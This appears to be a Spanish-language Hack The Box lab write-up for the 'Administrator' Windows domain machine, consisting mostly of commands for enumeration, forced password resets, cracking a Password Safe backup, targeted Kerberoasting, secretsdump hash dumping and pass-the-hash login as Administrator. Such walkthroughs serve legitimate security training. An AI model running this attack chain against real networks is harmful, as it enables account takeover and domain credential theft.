
# 🖥️ Hack The Box - Administrator

**IP:** `10.10.11.42`  
**Dominio:** `administrator.htb`  
**Sistema Operativo:** Windows Server 2022  
**Dificultad:** Medio-Avanzado  
**Objetivo:** Obtener acceso a `Administrator`

---

## 🔎 1. Enumeración inicial
```bash
netexec smb 10.10.11.42 --shares
```

---

## 🔐 2. Acceso inicial con WinRM
Credenciales válidas: `olivia:ichliebedich`

```bash
netexec winrm 10.10.11.42 -u olivia -p ichliebedich
evil-winrm -i 10.10.11.42 -u olivia -p 'ichliebedich'
```

---

## 🧠 3. Enumeración interna (rpcclient)
```bash
rpcclient -U 'Olivia%ichliebedich' 10.10.11.42
```

Comandos:
```bash
enumdomusers
enumdomgroups
querygroupmem 0x200
queryuser 0x1f4
```

---

## 🩸 4. Recolección de información con BloodHound
```bash
sudo bloodhound-python -u 'olivia' -p 'ichliebedich' -c All --zip -ns 10.10.11.42 -d administrator.htb
```

---

## 🔁 5. Cambio de contraseña de Michael
```bash
net rpc password 'michael' 'passwd123' -U 'administrator.htb/olivia%ichliebedich' -S 10.10.11.42
netexec winrm 10.10.11.42 -u michael -p passwd123
```

---

## 🪜 6. Escalada a Benjamin
```bash
net rpc password 'benjamin' 'passwd123' -U 'administrator.htb/michael%passwd123' -S 10.10.11.42
netexec smb 10.10.11.42 -u benjamin -p passwd123 --shares
```

---

## 📦 7. Acceso a archivos y crackeo
```bash
get Backup.psafe3
pwsafe2john Backup.psafe3 > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

---

## 🧪 8. Credenciales para Emily
```bash
evil-winrm -i 10.10.11.42 -u emily -p 'contraseña'
```

---

## 🧀 9. Kerberoasting dirigido
```bash
sudo ntpdate 10.10.11.42
python3 targetedKerberoast.py -d administrator.htb -u emily -p 'contraseña' --dc-ip 10.10.11.42
```

---

## 🧷 10. Acceso con Ethan
```bash
netexec smb 10.10.11.42 -u ethan -p 'contraseña'
secretsdump.py administrator.htb/ethan:contraseña@10.10.11.42
```

---

## 👑 11. Acceso a Administrator
```bash
evil-winrm -i 10.10.11.42 -u Administrator -H 
```

✅ ¡Rooted!
